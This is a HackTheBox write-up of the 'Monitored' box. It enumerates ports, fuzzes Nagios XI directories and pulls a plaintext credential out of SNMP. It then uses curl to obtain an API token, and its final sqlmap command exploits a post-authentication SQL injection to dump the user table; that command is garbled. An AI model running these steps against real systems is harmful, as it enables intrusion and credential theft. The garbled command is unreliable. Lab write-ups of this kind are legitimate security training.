---
title: "Monitored"
date: 2024-02-29T11:30:03+00:00
draft: false
tags: ["htb"]
description: "Monitored HacktheBox Writeup"
---

![](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*ht14f3nLye487pVBC_xxFQ.png)

Today we'll be covering an interesting box called *Monitored* introduced with a medium level difficulty so let's check it out.

### Nmap Scans.

Starting off with some port enumeration we get some interesting ports open.

```bash
PORT     STATE  SERVICE          VERSION
22/tcp   open   ssh              OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
53/tcp   closed domain
80/tcp   open   http             Apache httpd 2.4.56
135/tcp  closed msrpc
389/tcp  open   ldap
139/tcp  closed netbios-ssn
445/tcp  closed microsoft-ds
464/tcp  closed kpasswd5
593/tcp  closed http-rpc-epmap
636/tcp  closed ldapssl
1433/tcp closed ms-sql-s
3268/tcp closed globalcatLDAP
3269/tcp closed globalcatLDAPssl
5667/tcp open   tcpwrapped
Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel


```
## Web Enumeration (port 80)

Intially checking port 80 it redirects to `nagios.monitored.htb` 
![](https://imgur.com/ELNHUOG.png) checking the site out. We are redirected to nagios XI.
![](https://imgur.com/rcKawD1.png) which is a server and networking monitoring software.

## Fuzzing port 80.
Trying login with the default credentials found online didn't provide us with access, hence the next step was to fuzz for some directory that might be hidden.

```bash
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 305ms]
                        [Status: 200, Size: 3245, Words: 786, Lines: 75, Duration: 306ms]
.php                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 244ms]
.hta.php                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 257ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 243ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 231ms]
.htpasswd.php           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 238ms]
.htaccess.php           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 247ms]
cgi-bin/.php            [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 324ms]
cgi-bin/                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 324ms]
index.php               [Status: 200, Size: 3245, Words: 786, Lines: 75, Duration: 208ms]
index.php               [Status: 200, Size: 3245, Words: 786, Lines: 75, Duration: 254ms]
javascript              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 215ms]
nagios                  [Status: 401, Size: 460, Words: 42, Lines: 15, Duration: 227ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 239ms]
```
We see that the `nagios` directory seems interesting but navigating tot the directory doesn't produce anything fruitful, but looking at the link on the site we identify a certian keyword which seems like a directory `nagiosxi`.

## nagiosxi

Fuzzing the directory we get some interesting directories, 

```bash
# directory-list-2.3-small.txt [Status: 200, Size: 26737, Words: 5495, Lines: 468, Duration: 486ms]
help                    [Status: 200, Size: 26749, Words: 5495, Lines: 468, Duration: 267ms]
tools                   [Status: 200, Size: 26751, Words: 5495, Lines: 468, Duration: 298ms]
mobile                  [Status: 200, Size: 15978, Words: 2562, Lines: 225, Duration: 296ms]
admin                   [Status: 200, Size: 26751, Words: 5495, Lines: 468, Duration: 279ms]
reports                 [Status: 200, Size: 26755, Words: 5495, Lines: 468, Duration: 296ms]
account                 [Status: 200, Size: 26755, Words: 5495, Lines: 468, Duration: 294ms]
includes                [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 333ms]
backend                 [Status: 200, Size: 108, Words: 4, Lines: 5, Duration: 306ms]
db                      [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 251ms]
api                     [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 210ms]
config                  [Status: 200, Size: 26753, Words: 5495, Lines: 468, Duration: 291ms]
views                   [Status: 200, Size: 26751, Words: 5495, Lines: 468, Duration: 280ms]
sounds                  [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 259ms]
terminal                [Status: 200, Size: 5215, Words: 1247, Lines: 124, Duration: 275ms]
```
Checking out `terminal` directory, there's a shell in box gui which after trying out soem authentication bypasses it didn't work.
Later on went on to fuzz the `api` endpoint. 

## API 

Fuzzing the API endpoints gives us 2 endpoints the `v1` and `includes`. v1 when fuzzing api endpoints is an indicator of version controlled endpoints. checking out the v1 endpoint we get a lot of results.

**Note**: 
If we visit /api/v1/xxx we can see that all the “endpoints” were giving us same message with size of 32 so we gave -fs 32 option to filter out mostly false-positive hits.`

```bash

license                 [Status: 200, Size: 34, Words: 3, Lines: 2, Duration: 1163ms]
%20                     [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 350ms]
video games             [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 288ms]
authenticate            [Status: 200, Size: 53, Words: 7, Lines: 2, Duration: 2336ms]
```

We get an interesting endpoint called authenticate but trying to access it we find that, we can only use `POST` to authenticate and since we don't have any credentials to authenticate with decided to go back to the nmap results and enumerate more.

## UDP
```bash
PORT      STATE         SERVICE
7/udp     open|filtered echo
53/udp    open|filtered domain
68/udp    open|filtered dhcpc
123/udp   open          ntp
161/udp   open          snmp
162/udp   open|filtered snmptrap
16838/udp open|filtered unknown
18617/udp open|filtered unknown
21131/udp open|filtered unknown
21698/udp open|filtered unknown
28547/udp open|filtered unknown
49181/udp open|filtered unknown
```

Enumerating UDP ports, we find that snmp is open, enumerating snmp using [braa](https://github.com/mteg/braa) a mass snmp scanner. We get interesting results.
```bash
iso.3.6.1.2.1.25.4.2.1.5.505 = STRING: "--config /etc/laurel/config.toml"
iso.3.6.1.2.1.25.4.2.1.5.549 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.550 = STRING: "--system --address=systemd: --no fork --nopidfile --systemd-activation --syslog-only"
iso.3.6.1.2.1.25.4.2.1.5.553 = STRING: "-n -iNONE"
iso.3.6.1.2.1.25.4.2.1.5.556 = STRING: "-u -s -O /run/wpa_supplicant"
iso.3.6.1.2.1.25.4.2.1.5.568 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.583 = STRING: "-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB "
iso.3.6.1.2.1.25.4.2.1.5.642 = STRING: "-4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0"
iso.3.6.1.2.1.25.4.2.1.5.762 = STRING: "-f /usr/local/nagios/etc/pnp/npcd.cfg"
iso.3.6.1.2.1.25.4.2.1.5.769 = STRING: "-LOw -f -p /run/snmptrapd.pid"
iso.3.6.1.2.1.25.4.2.1.5.783 = STRING: "-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid"
iso.3.6.1.2.1.25.4.2.1.5.804 = STRING: "-p /var/run/ntpd.pid -g -u 108:116"
iso.3.6.1.2.1.25.4.2.1.5.806 = STRING: "-o -p -- \\u --noclear tty1 linux"
iso.3.6.1.2.1.25.4.2.1.5.841 = STRING: "-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit"
iso.3.6.1.2.1.25.4.2.1.5.843 = STRING: "-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit"
iso.3.6.1.2.1.25.4.2.1.5.848 = STRING: "-h ldap:/// ldapi:/// -g openldap -u openldap -F /etc/ldap/slapd.d"
iso.3.6.1.2.1.25.4.2.1.5.860 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.870 = STRING: "-D /var/lib/postgresql/13/main -c config_file=/etc/postgresql/13/main/postgresql.conf"
iso.3.6.1.2.1.25.4.2.1.5.942 = STRING: "/usr/sbin/snmptt --daemon"
iso.3.6.1.2.1.25.4.2.1.5.943 = STRING: "/usr/sbin/snmptt --daemon"
iso.3.6.1.2.1.25.4.2.1.5.972 = STRING: "-pidfile /run/xinetd.pid -stayalive -inetd_compat -inetd_ipv6"
iso.3.6.1.2.1.25.4.2.1.5.976 = STRING: "-d /usr/local/nagios/etc/nagios.cfg"
iso.3.6.1.2.1.25.4.2.1.5.977 = STRING: "--worker /usr/local/nagios/var/rw/nagios.qh"
iso.3.6.1.2.1.25.4.2.1.5.978 = STRING: "--worker /usr/local/nagios/var/rw/nagios.qh"
iso.3.6.1.2.1.25.4.2.1.5.979 = STRING: "--worker /usr/local/nagios/var/rw/nagios.qh"
```

we identify there's a user called `svc` and also a passowrd that the user tried to authenticate with.
```bash
iso.3.6.1.2.1.25.4.2.1.5.583 = STRING: "-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB "
```

## Initial Foothold.

Now having creds to login and hving prior knowledge that we have a few instances on the `API` and `terminal` endpoints that we had to try out, started out with the terminal endpoint, didn't give us any results, proceeded to the `API` endpoint where we are need to construct a post request so as to authenticate.

![](https://imgur.com/dEBYn5d.png)

An Auth Token Obtain after using curl.

```bash 
curl -X POST -k -L -d 'username=svc&password=XjH7VCehowpR1xZB' https://nagios.monitored.htb/nagiosxi/api/v1/authenticate/```

```bash 
{"username":"svc","user_id":"2","auth_token":"76064ac8a8a9ece7c349404e1f99a45665e9acfc","valid_min":5,"valid_until":"Fri, 23 Feb 2024 22:38:15 -0500"}
```
we get an auth token, going back to the `nagios` directory, we can authenticate and successfully login.

![](https://imgur.com/fHkual8.png)


According with this [CVE](https://www.cve.org/CVERecord?id=CVE-2023-40931) there is a Post-Auth SQLi, so let’s try POST /nagiosxi/admin/banner_message-ajaxhelper.php HTTP/1.1 to get the admin api_key which is in xi_users in this sqlmap command on the way to add new user with administrative privileges

```bash
sqlmap -u "https://nagios.monitored.htb//nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=curl -ksX POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate" --level 5 --risk 3 -p id --batch -D nagiosxi --dump -T xi_users | awk -F'"' '{print$12}'" --level 5 --risk 3 -p id --batch -D nagiosxi --dump -T xi_users

```


